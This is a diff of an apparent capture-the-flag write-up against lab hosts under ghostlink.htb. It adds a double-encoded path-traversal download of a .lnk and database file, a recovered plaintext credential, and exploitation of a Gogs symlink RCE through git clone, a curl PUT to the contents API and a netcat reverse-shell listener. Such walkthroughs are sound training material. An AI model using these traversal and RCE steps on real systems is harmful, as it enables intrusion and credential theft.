@@ -752,6 +752,8 @@ MRUListEx = 0
 
 Windows saves a link to recent documents location in `AppData\Roaming\Microsoft\Windows\Recent` under the same filename plus .lnk
 
+Downloading to find more info
+
 ```
 proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk' -O db.zip.lnk 
 [proxychains] config file found: /etc/proxychains4.conf
@@ -770,6 +772,8 @@ db.zip.lnk                  100%[===========================================>]  
 2026-10-31 11:22:34 (198 MB/s) - ‘db.zip.lnk’ saved [792/792]
 
 ```
+
+Disclosing the correct path:
 
 ```
 file db.zip.lnk                                                                      
@@ -808,12 +812,24 @@ Archive:  db.zip
                                                
 ```
 
+opening the db with the key provided discloses a password for the user vroth on the gogs dashboard
+
+![](./screens/14.png)
+
 vroth:mOo03jpsqx8JQYMBwvFP
 
 ---
 ### Exploitation
 
-Step-by-step exploitation with commands.
+As shown previously, gogs is vulnerable to cve 2025-8110, which allows an attacker to put a simlink into the config file (verify this info) and achieve rce:
+
+![](./screens/16.png)
+
+i generated a new token
+
+![](./screens/17.png)
+
+cloning the repo
 
 ```shell
 git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git 
@@ -886,7 +902,7 @@ curl -X PUT "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/conte
 {"message":"Something went wrong, please check the server logs for more information.","url":"https://github.com/gogs/docs-api"} 
 ```
 
-shell as git
+shell as git:
 
 ```
 nc -lvnp 4444
